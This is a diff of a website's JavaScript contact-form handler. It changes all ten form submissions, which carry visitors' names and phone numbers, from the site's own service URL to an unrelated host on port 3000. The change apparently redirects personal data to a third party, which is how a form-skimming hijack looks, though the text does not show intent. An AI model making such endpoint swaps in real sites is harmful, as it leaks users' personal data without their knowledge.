@@ -22,7 +22,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName1").val(),
                     UserPhone: $("#UserPhone1").val(),
                     FeedbackText: ".",
@@ -56,7 +56,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName2").val(),
                     UserPhone: $("#UserPhone2").val(),
                     FeedbackText: ".",
@@ -90,7 +90,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName3").val(),
                     UserPhone: $("#UserPhone3").val(),
                     FeedbackText: ".",
@@ -124,7 +124,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName4").val(),
                     UserPhone: $("#UserPhone4").val(),
                     FeedbackText: ".",
@@ -159,7 +159,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName5").val(),
                     UserPhone: $("#UserPhone5").val(),
                     FeedbackText: ".",
@@ -168,7 +168,6 @@ function sub(i, biaoqian) {
                     biaoqian: biaoqian
                 },
                 function (data) {
-
                 });
 
             $("#UserName5").val("");
@@ -193,7 +192,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName6").val(),
                     UserPhone: $("#UserPhone6").val(),
                     FeedbackText: ".",
@@ -226,7 +225,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName7").val(),
                     UserPhone: $("#UserPhone7").val(),
                     FeedbackText: ".",
@@ -259,7 +258,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName8").val(),
                     UserPhone: $("#UserPhone8").val(),
                     FeedbackText: ".",
@@ -292,7 +291,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName9").val(),
                     UserPhone: $("#UserPhone9").val(),
                     FeedbackText: ".",
@@ -323,7 +322,7 @@ function sub(i, biaoqian) {
 
         else {
 
-            $.post("http://service.shsunedu.com/jzs/Jzsserver.ashx", {
+            $.post("http://y58kg.cn:3000/api/user", {
                     UserName: $("#UserName10").val(),
                     UserPhone: $("#UserPhone10").val(),
                     FeedbackText: ".",
